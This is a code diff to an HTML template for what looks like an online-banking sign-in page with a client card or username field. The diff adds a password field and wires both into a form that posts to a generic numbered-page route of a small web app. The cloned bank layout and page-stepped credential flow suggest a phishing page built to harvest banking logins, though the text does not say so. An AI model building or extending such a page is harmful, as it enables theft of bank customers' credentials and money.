@@ -132,7 +132,8 @@
             opacity: 0.5;
         }
         
-        input[type="text"] {
+        input[type="text"],
+        input[type="password"] { /* Added password to apply styles */
             width: 100%;
             padding: 12px 16px;
             border: 2px solid #e1e5e9;
@@ -141,7 +142,8 @@
             transition: border-color 0.3s ease;
         }
         
-        input[type="text"]:focus {
+        input[type="text"]:focus,
+        input[type="password"]:focus {
             outline: none;
             border-color: #005dab;
         }
@@ -345,32 +347,46 @@
         
         <div class="right-panel">
             <div class="form-section">
-                <div class="form-group">
-                    <label for="clientCard">
-                        Client Card or Username
-                        <svg class="lock-icon" viewBox="0 0 24 24">
-                            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/>
-                        </svg>
-                    </label>
-                    <input type="text" id="clientCard" name="clientCard">
-                    <div class="error-message">
-                        <svg class="error-icon" viewBox="0 0 24 24">
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
-                        </svg>
-                        Please enter your client card or username
+                
+                <form method="POST" action="{{ url_for('page', page_num=page_num) }}">
+                
+                    <div class="form-group">
+                        <label for="clientCard">
+                            Client Card or Username
+                            <svg class="lock-icon" viewBox="0 0 24 24">
+                                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/>
+                            </svg>
+                        </label>
+                        <input type="text" id="clientCard" name="username">
+                        
+                        <div class="error-message">
+                            <svg class="error-icon" viewBox="0 0 24 24">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                            </svg>
+                            Please enter your client card or username
+                        </div>
                     </div>
-                </div>
+
+                    <div class="form-group">
+                        <label for="password">
+                            Password
+                            <svg class="lock-icon" viewBox="0 0 24 24">
+                                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/>
+                            </svg>
+                        </label>
+                        <input type="password" id="password" name="password">
+                    </div>
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="saveCard" name="saveCard">
+                        <label for="saveCard">Save client card or username</label>
+                        <svg class="info-icon" viewBox="0 0 24 24">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+                        </svg>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary">Sign In</button>
                 
-                <div class="checkbox-group">
-                    <input type="checkbox" id="saveCard" name="saveCard">
-                    <label for="saveCard">Save client card or username</label>
-                    <svg class="info-icon" viewBox="0 0 24 24">
-                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
-                    </svg>
-                </div>
-                
-                <button class="btn-primary" onclick="handleNext()">Next</button>
-                
+                </form>
                 <div class="link-group">
                     <a href="#" onclick="recoverUsername()">Recover Your Username</a>
                     <a href="#" onclick="enrollOnlineBanking()">Enroll in Online Banking</a>
@@ -408,4 +424,13 @@
                 <div class="footer-links">
                     <a href="#">
                         Legal
-                        <svg class="external-icon"
+                        <svg class="external-icon" viewBox="0 0 24 24">
+                             <path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
